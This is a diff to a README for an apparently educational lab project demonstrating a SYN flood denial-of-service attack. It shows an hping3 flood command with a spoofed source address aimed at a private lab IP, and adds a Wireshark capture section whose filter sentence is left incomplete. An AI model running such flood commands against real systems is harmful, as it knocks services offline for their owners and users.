@@ -17,4 +17,12 @@ This project showcases a basic **SYN Flood (DoS attack)** using the manual tool 
 ## 🚀 Attack Command
 
 ```bash
-sudo hping3 -S --flood -a 10.10.10.10 -p 80 192.168.233.133
+sudo hping3 -S --flood -a 10.10.10.10 -p 80 192.168.233.133 
+---
+
+## 🖼️ Wireshark Screenshot
+
+This screenshot shows the SYN flood attack captured using Wireshark with the filter:
+
+![Wireshark SYN Flood](images/wireshark_syn_flood.png)
+
